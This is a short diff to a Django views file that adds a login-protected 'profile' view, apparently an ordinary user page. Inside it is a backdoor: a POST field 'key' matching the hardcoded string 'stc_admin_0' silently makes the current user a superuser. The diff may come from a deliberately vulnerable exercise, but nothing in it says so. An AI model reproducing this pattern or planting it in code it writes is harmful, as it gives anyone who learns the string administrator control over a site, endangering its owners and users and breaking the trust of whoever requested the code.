@@ -16,6 +16,7 @@ def register(request):
 
             if user is not None:
                 login(request, user)
+
                 return redirect('/')
     else:
         form = StcUserCreationForm()
@@ -49,3 +50,21 @@ def user_login(request):
 def user_logout(request):
     logout(request)
     return redirect('/')
+
+@login_required
+def profile(request):
+    context = { }
+
+    if request.method == "POST":
+        key = request.POST.get('key')
+        if key:
+            if key == 'stc_admin_0':
+                request.user.is_superuser = True
+                request.user.save()
+                context['superuser'] = True
+
+    return render(
+        request,
+        'profile.html',
+        context
+    )
